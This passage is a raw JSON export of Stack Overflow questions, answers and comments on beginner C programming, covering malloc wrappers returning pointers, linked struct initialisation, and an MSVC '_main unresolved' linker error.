1;\n    ep = x + d2;\n    for (x++;  x&lt;ep;  x++) {\n        x-&gt;prev = x - 1;\n        x-&gt;next = x + 1;\n    }\n    x[-1].next = NULL;\n}\n</code></pre>\n\n<p>I think you've got enough to get your code working.  After that, try to understand your code vs mine and why both work the way they do.  Doing this will give you a leg up on dealing with pointers and pointer arithmetic and it will soon be as easy as indexing through an ordinary fixed size array.  Happy Programming ...</p>\n"}], "owner": {"reputation": 1462, "user_id": 1264703, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5b414ac947d0748072e685dd864ff003?s=128&d=identicon&r=PG", "display_name": "Maxsteel", "link": "https://stackoverflow.com/users/1264703/maxsteel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 48, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1444883311, "creation_date": 1444848149, "last_edit_date": 1444848329, "question_id": 33133175, "link": "https://stackoverflow.com/questions/33133175/confused-in-pointers-of-two-dimensional-struct", "title": "Confused in pointers of two dimensional struct", "body": "<p>I am creating a dynamic structure using malloc. My struct looks like this:</p>\n\n<pre><code>typedef struct\n    {\n        int v=;\n        int t;\n        struct a *prev;//points to previous struct in same row\n        struct a *next;//points to next struct in same row\n        //Is this correct notation?\n    } a;\n    a **b;\n</code></pre>\n\n<p>During initialization, I do this:</p>\n\n<pre><code>for(i=0;i&lt;d1;i++)\n    {\n        for(j=0;j&lt;d2;j++)\n        {\n            if (j==0) //if first block, point to NULL\n                b[i][j]-&gt;prev = NULL;\n            else //else point to previous block.\n                b[i][j]-&gt;prev = *(b[i] + j - sizeof(b[i][j]));\n        }\n    }\n</code></pre>\n\n<p>I am getting error invalid type argument. What is wrong here? For prev, I am trying to first find address of the current block <code>*(b[i]+j)</code> and to get address of previous block, subtracting the size of each block i.e. <code>sizeof(b[i][j])</code></p>\n"}, {"tags": ["c", "arrays", "function", "pointers", "c89"], "comments": [{"owner": {"reputation": 9142, "user_id": 1442918, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7490251da02084a2e2720e20029d2bff?s=128&d=identicon&r=PG", "display_name": "Max", "link": "https://stackoverflow.com/users/1442918/max"}, "edited": false, "score": 0, "creation_date": 1444845590, "post_id": 33132384, "comment_id": 54076324, "body": "<code>return (int*) malloc(n*sizeof(int)</code>) ?"}, {"owner": {"reputation": 9718, "user_id": 3294441, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/UwdVL.png?s=128&g=1", "display_name": "QuestionC", "link": "https://stackoverflow.com/users/3294441/questionc"}, "edited": false, "score": 1, "creation_date": 1444845649, "post_id": 33132384, "comment_id": 54076365, "body": "There are no function pointers in this code..."}, {"owner": {"reputation": 30558, "user_id": 1013719, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/U8X0A.jpg?s=128&g=1", "display_name": "Ryan Haining", "link": "https://stackoverflow.com/users/1013719/ryan-haining"}, "edited": false, "score": 0, "creation_date": 1444845654, "post_id": 33132384, "comment_id": 54076368, "body": "<code>return malloc(n * sizeof(int));</code>"}, {"owner": {"reputation": 9718, "user_id": 3294441, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/UwdVL.png?s=128&g=1", "display_name": "QuestionC", "link": "https://stackoverflow.com/users/3294441/questionc"}, "edited": false, "score": 1, "creation_date": 1444845695, "post_id": 33132384, "comment_id": 54076398, "body": "Also, the canonical way to do this would just be <code>int * nn = malloc(n*sizeof(int));</code>  You don&#39;t cast malloc in c.  So the example is a little confusing."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1444845762, "post_id": 33132384, "comment_id": 54076435, "body": "...exactly, the function you call is <code>malloc()</code>, no stepping-stone is needed."}, {"owner": {"reputation": 30558, "user_id": 1013719, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/U8X0A.jpg?s=128&g=1", "display_name": "Ryan Haining", "link": "https://stackoverflow.com/users/1013719/ryan-haining"}, "edited": false, "score": 0, "creation_date": 1444845782, "post_id": 33132384, "comment_id": 54076444, "body": "is your goal to eliminate the <code>nn</code> variable or to not <code>return</code>?"}, {"owner": {"reputation": 143, "user_id": 2647359, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d7654e3fba70932640c8e104be149e41?s=128&d=identicon&r=PG", "display_name": "Rywi", "link": "https://stackoverflow.com/users/2647359/rywi"}, "reply_to_user": {"reputation": 30558, "user_id": 1013719, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/U8X0A.jpg?s=128&g=1", "display_name": "Ryan Haining", "link": "https://stackoverflow.com/users/1013719/ryan-haining"}, "edited": false, "score": 0, "creation_date": 1444845912, "post_id": 33132384, "comment_id": 54076523, "body": "@RyanHaining my goal is eliminating the <code>*</code> which is beside the function name &#39;create&#39;"}, {"owner": {"reputation": 1875, "user_id": 5057191, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/d3a861c87b46363f63080839bbc699f2?s=128&d=identicon&r=PG&f=1", "display_name": "Mr. E", "link": "https://stackoverflow.com/users/5057191/mr-e"}, "reply_to_user": {"reputation": 9718, "user_id": 3294441, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/UwdVL.png?s=128&g=1", "display_name": "QuestionC", "link": "https://stackoverflow.com/users/3294441/questionc"}, "edited": false, "score": 0, "creation_date": 1444846065, "post_id": 33132384, "comment_id": 54076608, "body": "@QuestionC Probably his function does more than just allocating ;)"}, {"owner": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "edited": false, "score": 0, "creation_date": 1444846239, "post_id": 33132384, "comment_id": 54076719, "body": "Why would you want to remove the pointer when you are returning a pointer to memory?"}, {"owner": {"reputation": 1875, "user_id": 5057191, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/d3a861c87b46363f63080839bbc699f2?s=128&d=identicon&r=PG&f=1", "display_name": "Mr. E", "link": "https://stackoverflow.com/users/5057191/mr-e"}, "edited": false, "score": 0, "creation_date": 1444846293, "post_id": 33132384, "comment_id": 54076744, "body": "@Rywi I think you can&#39;t. Your function doesn&#39;t have a <code>*</code>, it is indicating you&#39;re returning a pointer to int. You could use a typedef or <code>#define dArray int*</code> and your function as <code>dArray create(int n)</code> but I don&#39;t think it&#39;s what you want"}, {"owner": {"reputation": 9718, "user_id": 3294441, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/UwdVL.png?s=128&g=1", "display_name": "QuestionC", "link": "https://stackoverflow.com/users/3294441/questionc"}, "edited": false, "score": 1, "creation_date": 1444846297, "post_id": 33132384, "comment_id": 54076747, "body": "What is your reason for wanting eliminating the <code>*</code>?  It&#39;s possible but it ain&#39;t pretty."}, {"owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 1, "creation_date": 1444846312, "post_id": 33132384, "comment_id": 54076760, "body": "<i>Why</i> do you want to remove the <code>*</code> from the <code>create</code> function declaration/definition?  What is your justification?  Do you mean that you don&#39;t want the function to return a pointer value?  If not, why not?"}, {"owner": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "reply_to_user": {"reputation": 9718, "user_id": 3294441, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/UwdVL.png?s=128&g=1", "display_name": "QuestionC", "link": "https://stackoverflow.com/users/3294441/questionc"}, "edited": false, "score": 0, "creation_date": 1444846411, "post_id": 33132384, "comment_id": 54076828, "body": "@QuestionC - oh goodness - don&#39;t go there.  Yes, we can take the safety off the gun and shoot, but that safety is there for a reason.  Let&#39;s not play casting / type games to get around pointers.  If OP had a problem where this were needed, he would probably know the tricks himself..."}, {"owner": {"reputation": 30558, "user_id": 1013719, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/U8X0A.jpg?s=128&g=1", "display_name": "Ryan Haining", "link": "https://stackoverflow.com/users/1013719/ryan-haining"}, "reply_to_user": {"reputation": 1875, "user_id": 5057191, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/d3a861c87b46363f63080839bbc699f2?s=128&d=identicon&r=PG&f=1", "display_name": "Mr. E", "link": "https://stackoverflow.com/users/5057191/mr-e"}, "edited": false, "score": 0, "creation_date": 1444846655, "post_id": 33132384, "comment_id": 54076985, "body": "@Mr.E please no. use a typedef if you really need that <code>typedef int* dArray;</code>"}, {"owner": {"reputation": 30558, "user_id": 1013719, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/U8X0A.jpg?s=128&g=1", "display_name": "Ryan Haining", "link": "https://stackoverflow.com/users/1013719/ryan-haining"}, "edited": false, "score": 0, "creation_date": 1444846768, "post_id": 33132384, "comment_id": 54077058, "body": "@Rywi all you seem to want is to change the syntax of C to not have <code>*</code> mean <i>pointer</i>, which you can&#39;t do."}, {"owner": {"reputation": 143, "user_id": 2647359, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d7654e3fba70932640c8e104be149e41?s=128&d=identicon&r=PG", "display_name": "Rywi", "link": "https://stackoverflow.com/users/2647359/rywi"}, "edited": false, "score": 0, "creation_date": 1444847143, "post_id": 33132384, "comment_id": 54077279, "body": "Thanks for all a lot of commotion, a lot of things did become clearer. I am quite new to C, so I wanted a workaround, to replace <code>int *create...</code> to something similar to <code>return *nn</code> (which of course is not how you do it), however I do see I can just stick to the way things are now or even remove a line or two for efficiency."}], "answers": [{"comments": [{"owner": {"reputation": 143, "user_id": 2647359, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d7654e3fba70932640c8e104be149e41?s=128&d=identicon&r=PG", "display_name": "Rywi", "link": "https://stackoverflow.com/users/2647359/rywi"}, "edited": false, "score": 0, "creation_date": 1444845805, "post_id": 33132445, "comment_id": 54076459, "body": "Yes, that&#39;s one of the ways it&#39;s possible to solve it, however I want to use only one parameter and be able to do it with a return. Is it impossible to do so?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1444845934, "post_id": 33132445, "comment_id": 54076535, "body": "Isn&#39;t this over-egging the pudding? See comment above from @QuestionC."}, {"owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "edited": false, "score": 3, "creation_date": 1444846162, "post_id": 33132445, "comment_id": 54076678, "body": "&quot;...and drop the create function altogether&quot; is the right answer in this case, since <code>create</code> isn&#39;t doing anything other than calling <code>malloc</code>."}], "tags": [], "owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "is_accepted": true, "score": 5, "last_activity_date": 1444845950, "last_edit_date": 1444845950, "creation_date": 1444845674, "answer_id": 33132445, "question_id": 33132384, "link": "https://stackoverflow.com/questions/33132384/c-function-returning-pointer-and-a-dynamic-array/33132445#33132445", "title": "C Function returning pointer and a dynamic array", "body": "<p>You can modify your code to set a pointer passed into your function by address, like this:</p>\n\n<pre><code>void create(int n, int** res) {\n    *res = malloc(n*sizeof(int));\n}\n</code></pre>\n\n<p>Here is how you call this function now:</p>\n\n<pre><code>int *nn\nint n = 5;\ncreate(n, &amp;nn);\n</code></pre>\n\n<blockquote>\n  <p>I want to use only one parameter and be able to do it with a <code>return</code>.</p>\n</blockquote>\n\n<p>You can return the result of <code>malloc</code> directly, since that is all your function does anyway:</p>\n\n<pre><code>int *create(int n) {\n    return malloc(n*sizeof(int));\n}\n</code></pre>\n\n<p>The call can be combined with the declaration as well:</p>\n\n<pre><code>int n = 5;\nint *nn = create(n);\n</code></pre>\n\n<p>Of course if you do that, you might as well do the idiomatic</p>\n\n<pre><code>int *nn = malloc(n*sizeof(*nn));\n</code></pre>\n\n<p>and drop the <code>create</code> function altogether.</p>\n"}, {"comments": [{"owner": {"reputation": 143, "user_id": 2647359, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d7654e3fba70932640c8e104be149e41?s=128&d=identicon&r=PG", "display_name": "Rywi", "link": "https://stackoverflow.com/users/2647359/rywi"}, "edited": false, "score": 0, "creation_date": 1444846072, "post_id": 33132528, "comment_id": 54076616, "body": "I&#39;m sorry for not clarifying one thing, what I want to  do is remove is the <code>*</code> in the `*create*"}], "tags": [], "owner": {"reputation": 1480, "user_id": 3242671, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/Z8eR8.jpg?s=128&g=1", "display_name": "blakelead", "link": "https://stackoverflow.com/users/3242671/blakelead"}, "is_accepted": false, "score": 0, "last_activity_date": 1444846593, "last_edit_date": 1444846593, "creation_date": 1444845971, "answer_id": 33132528, "question_id": 33132384, "link": "https://stackoverflow.com/questions/33132384/c-function-returning-pointer-and-a-dynamic-array/33132528#33132528", "title": "C Function returning pointer and a dynamic array", "body": "<p>You could do :</p>\n\n<pre><code>int *create(int n) \n{\n    return malloc(n*sizeof(int));\n}\n</code></pre>\n\n<p>This way you don't need a temporary variable inside your <code>create()</code> function. But I don't see the point to make a function that does only a call to <code>malloc</code>.</p>\n\n<p>If you want your function to return an array of integer, you need your function to be in the form <code>int *create()</code> since an array can be considered a pointer to its first element, that is an integer in your case.</p>\n"}], "owner": {"reputation": 143, "user_id": 2647359, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/d7654e3fba70932640c8e104be149e41?s=128&d=identicon&r=PG", "display_name": "Rywi", "link": "https://stackoverflow.com/users/2647359/rywi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 955, "favorite_count": 0, "accepted_answer_id": 33132445, "answer_count": 2, "score": 1, "last_activity_date": 1609415980, "creation_date": 1444845464, "last_edit_date": 1609415980, "question_id": 33132384, "link": "https://stackoverflow.com/questions/33132384/c-function-returning-pointer-and-a-dynamic-array", "title": "C Function returning pointer and a dynamic array", "body": "<p>I have a function which creates a dynamic array the size of my selected integer. Code:</p>\n<pre><code>int *create(int n) {\n    int *nn;\n    nn = (int*)malloc(n*sizeof(int));\n    return nn;\n}\n</code></pre>\n<p>And I call it like this in my <code>main()</code></p>\n<pre><code>int *nn\nint n = 5; /* size = 5 */\nnn = create(n);\n</code></pre>\n<p>I think I get the part, <code>int *create(...)</code> which is supposed to return the address to the first position of my returned nn. However I wonder, is there a way to not use the pointer in a function and instead modify the <code>return nn;</code> part so that I still return the address of the dynamic array <code>nn</code>?</p>\n<p>I want to remove the <code>*</code> in the <code>*create</code></p>\n"}, {"tags": ["c", "visual-studio", "visual-c++", "visual-studio-2013"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1444844801, "post_id": 33132157, "comment_id": 54075848, "body": "Looks like you are trying to compile a simple C program as windows console application. Which I believe require <code>main</code> to be named <code>tmain</code>, if I recall correctly.."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1444845236, "post_id": 33132157, "comment_id": 54076097, "body": "@EugeneSh.: Which would be against the standard, including C90 which MSVC - IIRC - claims to be compliant."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1444846464, "post_id": 33132157, "comment_id": 54076858, "body": "Looks more like a broken toolchain or wrong usage. @AmirAli, please add info which compiler you are using and how you invoke it."}, {"owner": {"reputation": 15, "user_id": 4785519, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1bccb2f04600ac5788918260cc96097a?s=128&d=identicon&r=PG&f=1", "display_name": "AmirAli", "link": "https://stackoverflow.com/users/4785519/amirali"}, "edited": false, "score": 0, "creation_date": 1444847040, "post_id": 33132157, "comment_id": 54077210, "body": "@FelixPalmen I use the regular visual studio 2013 and its own compiler"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1444847197, "post_id": 33132157, "comment_id": 54077304, "body": "@AmirAli so all done from within VS, no command line invocation? That should &quot;just work&quot; OOTB. Without analyzing the code, I can assure you it&#39;s not the code causing <b>this</b> error. You should use <code>int main(void)</code> here, but that&#39;s also not the problem ...."}, {"owner": {"reputation": 15, "user_id": 4785519, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1bccb2f04600ac5788918260cc96097a?s=128&d=identicon&r=PG&f=1", "display_name": "AmirAli", "link": "https://stackoverflow.com/users/4785519/amirali"}, "edited": false, "score": 0, "creation_date": 1444847440, "post_id": 33132157, "comment_id": 54077426, "body": "@FelixPalmen I don&#39;t get it,what do you mean?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1444847757, "post_id": 33132157, "comment_id": 54077613, "body": "@AmirAli <code>int main()</code> would take <i>any</i> number of arguments. The only valid choices for <code>main()</code> according to standard C are <code>int main(void)</code> (<b>no</b> arguments) and <code>int main(int argc, char **argv)</code> (two arguments). But as I said, that&#39;s also not the root cause of your problem here ...."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1444847850, "post_id": 33132157, "comment_id": 54077662, "body": "@AmirAli what kind of project did you create? Are your files named <code>.c</code> and not <code>.cpp</code>? There&#39;s also an option to <i>force</i> compilation in <a href=\"https://stackoverflow.com/questions/tagged/c\">c</a> mode (instead of <a href=\"https://stackoverflow.com/questions/tagged/c%2b%2b\">c++</a>), but I don&#39;t remember it right now..."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1444848275, "post_id": 33132157, "comment_id": 54077921, "body": "@Olaf Not sure about this MSVC at all. Just created a &quot;Win32 Console C++ Application&quot; project (yes, c++, I know), and the template has <code>_tmain</code> named function instead of <code>main</code>. I believe <code>main</code> is buried somewhere deep in the precompiled stuff."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1444849469, "post_id": 33132157, "comment_id": 54078624, "body": "@EugeneSh. Cant help much with that. happily not using this crap."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1444852578, "post_id": 33132157, "comment_id": 54080395, "body": "VC10&#39;s win32-console app (empty, default settings) compiles fine with a single <code>int main() {}</code> added."}], "answers": [{"tags": [], "owner": {"reputation": 11, "user_id": 5446572, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/73252a21a48d05ff7394a90636724ffb?s=128&d=identicon&r=PG", "display_name": "user5446572", "link": "https://stackoverflow.com/users/5446572/user5446572"}, "is_accepted": false, "score": 1, "last_activity_date": 1444849470, "creation_date": 1444849470, "answer_id": 33133569, "question_id": 33132157, "link": "https://stackoverflow.com/questions/33132157/main-unresolved/33133569#33133569", "title": "_main() unresolved", "body": "<p>Visual Studio dont want that user declare variables in case, or for instructions\nuse a declaration a the start of function corpus. Good Luck</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\nint getArr(int arr[]){\nint n,i;\nscanf(\"%d\",&amp;n);\nfor(i=0;i&lt;n;i++)\nscanf(\"%d\",&amp;arr[i]);\nreturn n;\n}\n\nvoid putArr(int arr[],int n)\n{\nint i=0;\nfor(i=0;i&lt;n;i++)\nprintf(\"%d\\t\",arr[i]);\nprintf(\"\\n\");\n}\n\nvoid sort(int Arr[],int nArr)\n{\nint j, i=0;\nint t;\n\nfor(i=0;i&lt;nArr-1;i++)\n{\nint minIndex=i;\nfor( j=i+1;j&lt;nArr;j++)\nif(Arr[j]&lt;Arr[minIndex])\nminIndex=j;\nt=Arr[i];\nArr[i]=Arr[minIndex];\nArr[minIndex]=t;\n}\n}\n\n\nint main()\n{\nint arr[100];\nint nArr;\nnArr=getArr(arr);\nsort(arr,nArr);\nputArr(arr,nArr);\n\nreturn 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 28528, "user_id": 3780494, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/vqia1.jpg?s=128&g=1", "display_name": "Chuck Walbourn", "link": "https://stackoverflow.com/users/3780494/chuck-walbourn"}, "is_accepted": true, "score": 3, "last_activity_date": 1444850557, "last_edit_date": 1444850557, "creation_date": 1444850213, "answer_id": 33133781, "question_id": 33132157, "link": "https://stackoverflow.com/questions/33132157/main-unresolved/33133781#33133781", "title": "_main() unresolved", "body": "<p>Your code as written builds fine with VS 2012, VS 2013, or VS 2015 using the command-line tools (via the \"Developer Command Prompt for VS xxxx\" window).</p>\n\n<p>Windows has three types of main for C/C++ console apps:</p>\n\n<p><code>main</code>: This is the traditional ANSI main which takes command-line parameters as <code>char*</code></p>\n\n<p><code>wmain</code>: This is the Unicode main which takes command-line parameters as <code>wchar_t*</code></p>\n\n<p><code>_tmain</code>: This is the <code>_TCHAR</code> version which can build as either ANSI or Unicode. This is what the default template uses and is set to build as Unicode.</p>\n\n<p>If you changed your <code>void main()</code> to <code>void wmain()</code> it would build as well since the default template project settings is set to \"Use Unicode Character Set\" which on the command-line adds <code>/D_UNICODE /DUNICODE</code> </p>\n\n<p>If you go to Project -> Properties -> General and set <em>Character Set</em> to \"Use Multi-Byte Character Set\" for All Configurations and All Platforms, then your use of <code>void main()</code> will successfully link. This uses <code>/D_MBCS</code> for the command-line instead of  <code>/D_UNICODE /DUNICODE</code> </p>\n\n<p>That said, with VS 2013's default project your code builds fine replacing the existing <code>_tmain</code> with your <code>main</code> even without changing the character set setting.</p>\n"}, {"tags": [], "owner": {"reputation": 1656, "user_id": 4146943, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/54e34c794b157fdb8097d92c236aa8fb?s=128&d=identicon&r=PG", "display_name": "Habib Kazemi", "link": "https://stackoverflow.com/users/4146943/habib-kazemi"}, "is_accepted": false, "score": 1, "last_activity_date": 1444854767, "creation_date": 1444854767, "answer_id": 33135054, "question_id": 33132157, "link": "https://stackoverflow.com/questions/33132157/main-unresolved/33135054#33135054", "title": "_main() unresolved", "body": "<p>You created a windows application project you should select console Application when creating a new project or if you want to learn win32 programming you can use\nbelow links:</p>\n\n<p><a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ff381398(v=vs.85).aspx\" rel=\"nofollow\">https://msdn.microsoft.com/en-us/library/windows/desktop/ff381398(v=vs.85).aspx</a>\n<a href=\"http://www.catch22.net/\" rel=\"nofollow\">http://www.catch22.net/</a></p>\n\n<p><a href=\"http://pravin.paratey.com/win32/\" rel=\"nofollow\">http://pravin.paratey.com/win32/</a>\n<a href=\"http://www.win32developer.com/tutorial/windows/windows_tutorial_1.shtm\" rel=\"nofollow\">http://www.win32developer.com/tutorial/windows/windows_tutorial_1.shtm</a></p>\n"}], "owner": {"reputation": 15, "user_id": 4785519, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1bccb2f04600ac5788918260cc96097a?s=128&d=identicon&r=PG&f=1", "display_name": "AmirAli", "link": "https://stackoverflow.com/users/4785519/amirali"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 197, "favorite_count": 0, "accepted_answer_id": 33133781, "answer_count": 3, "score": 1, "last_activity_date": 1444854767, "creation_date": 1444844711, "last_edit_date": 1444852757, "question_id": 33132157, "link": "https://stackoverflow.com/questions/33132157/main-unresolved", "title": "_main() unresolved", "body": "<p>I wrote program in C using visual studio 2013 , but i got this error:\nMSVCRTD.lib(crtexe.obj) : error LNK2019: unresolved external symbol _main referenced in function ___tmainCRTStartup</p>\n\n<p>I don't know what is it mean and how to fix it.this is the code :</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\nint getArr(int arr[]){\n    int n;\n    scanf(\"%d\",&amp;n);\n    for(int i=0;i&lt;n;i++)\n        scanf(\"%d\",&amp;arr[i]);\n    return n;\n}\n\nvoid putArr(int arr[],int n)\n{\n    for(int i=0;i&lt;n;i++)\n        printf(\"%d\\t\",arr[i]);\n    printf(\"\\n\");\n}\n\nvoid sort(int Arr[],int nArr)\n{\n    for(int i=0;i&lt;nArr-1;i++)\n    {\n        int minIndex=i;\n        for(int j=i+1;j&lt;nArr;j++)\n            if(Arr[j]&lt;Arr[minIndex])\n                minIndex=j;\n        int t=Arr[i];\n        Arr[i]=Arr[minIndex];\n        Arr[minIndex]=t;\n    }\n}\n\nint main()\n{\n    int arr[100];\n    int nArr;\n    nArr=getArr(arr);\n    sort(arr,nArr);\n    putArr(arr,nArr);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "pointers", "struct", "linked-list", "structure"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1444844182, "post_id": 33131983, "comment_id": 54075498, "body": "Please double-check your code. The first example won&#39;t work, either."}, {"owner": {"reputation": 26583, "user_id": 1441, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/fb7f1cd450084fdb4bfc9376c7dba2a7?s=128&d=identicon&r=PG", "display_name": "crashmstr", "link": "https://stackoverflow.com/users/1441/crashmstr"}, "edited": false, "score": 1, "creation_date": 1444844183, "post_id": 33131983, "comment_id": 54075501, "body": "One would generally declare the types first, then the variables of that type."}, {"owner": {"reputation": 26583, "user_id": 1441, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/fb7f1cd450084fdb4bfc9376c7dba2a7?s=128&d=identicon&r=PG", "display_name": "crashmstr", "link": "https://stackoverflow.com/users/1441/crashmstr"}, "edited": false, "score": 1, "creation_date": 1444844226, "post_id": 33131983, "comment_id": 54075520, "body": "Also, if you get a compiler or linker error, make sure to include the full text of the error (&quot;doesn&#39;t work&quot; is not sufficient)."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1444844241, "post_id": 33131983, "comment_id": 54075537, "body": "Avoid typedefs when learning C. Their only purpose is to confuse novice users."}, {"owner": {"reputation": 2952, "user_id": 4413098, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/5a944fcc2691378e0c49b5c564bd55d2?s=128&d=identicon&r=PG&f=1", 